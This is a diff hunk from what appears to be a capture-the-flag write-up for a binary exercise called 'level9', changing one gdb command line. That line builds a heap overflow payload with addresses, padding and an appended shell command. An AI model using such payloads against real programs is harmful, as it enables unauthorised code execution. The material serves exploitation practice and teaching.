@@ -68,7 +68,7 @@ To do so, we can overflow the buffer of the first object with a payload that con
 If we try the payload below, we can see that the heap is correctly overwritten:
 
 ```bash
-Starting program: /home/user/level9/level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08" + "||bash\x00\x00")')
+Starting program: /home/user/level9/level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08" + "||sh")')
 
 Breakpoint 1, 0x08048693 in main ()
 (gdb) x/32wx 0x804a008
